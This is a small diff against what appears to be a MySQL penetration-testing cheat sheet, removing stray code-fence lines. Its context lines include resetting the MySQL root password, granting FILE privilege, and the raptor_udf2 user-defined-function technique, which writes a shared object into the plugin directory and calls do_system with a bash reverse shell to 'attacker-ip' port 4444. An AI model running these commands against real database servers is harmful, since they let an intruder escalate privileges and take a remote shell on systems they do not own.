@@ -17,7 +17,6 @@ mysql -u username -p -e "SELECT @@version;"
 # Connect without database selection
 mysql -u username -h target.com -p --skip-database
 ```
-```
 Using mysqldump
 # Dump specific database
 mysqldump -u username -p database_name > backup.sql
@@ -317,7 +316,6 @@ FLUSH PRIVILEGES;
 UPDATE mysql.user SET password=PASSWORD('newpassword') WHERE user='root';
 FLUSH PRIVILEGES;
 ```
-```
 # Grant FILE privilege to user
 GRANT FILE ON *.* TO 'username'@'localhost';
 FLUSH PRIVILEGES;
@@ -443,7 +441,6 @@ mysql> insert into foo values(load_file('/path/to/raptor_udf2.so'));
 mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 mysql> create function do_system returns integer soname 'raptor_udf2.so';
 mysql> select do_system('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
-```
 Common MySQL Commands
 Command	Description	Usage
 SHOW DATABASES;	Lists all databases	SHOW DATABASES;
